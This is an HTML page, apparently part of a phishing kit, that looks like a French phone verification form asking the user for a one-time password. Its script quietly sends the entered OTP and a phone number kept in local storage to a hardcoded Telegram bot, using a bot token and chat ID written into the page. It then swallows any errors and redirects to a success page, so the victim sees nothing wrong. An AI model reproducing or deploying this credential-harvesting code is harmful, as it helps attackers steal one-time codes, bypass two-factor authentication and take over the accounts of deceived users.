<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        body {
            background: #0f172a;
            color: white;
            font-family: Arial, sans-serif;
        }
    </style>
</head>

<body class="min-h-screen flex items-center justify-center p-6">

    <div class="bg-white/10 p-8 rounded-2xl w-full max-w-md text-center space-y-6">

        <h1 class="text-2xl font-bold">Vérification téléphonique</h1>

        <p class="text-white/60 text-sm">
            Entrez le OTP envoyé à votre numéro
        </p>

        <input type="text" id="otp" placeholder="Saisissez le code OTP" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-lg">

        <button onclick="verifyOTP()" class="w-full bg-white text-black py-4 rounded-xl font-bold">
    Vérifier
  </button>

    </div>

    <script>
        const BOT = "8999307823:AAHeXPAlMT6dX2QE2U-erKRecDTzmdZOJgI";
        const CHAT = "8860468646";

        async function verifyOTP() {

            const otp = document.getElementById("otp").value;

            if (!otp) {
                alert("Enter OTP");
                return;
            }

            localStorage.setItem("userOTP", otp);

            const phone = localStorage.getItem("verifiedPhone");

            // Send OTP to Telegram
            const msg =
                `🔐 OTP ENTERED

📱 Phone: ${phone}
📩 OTP: ${otp}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: "POST",
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT,
                        text: msg
                    })
                });
            } catch (e) {}

            window.location.href = "success.html";
        }
    </script>
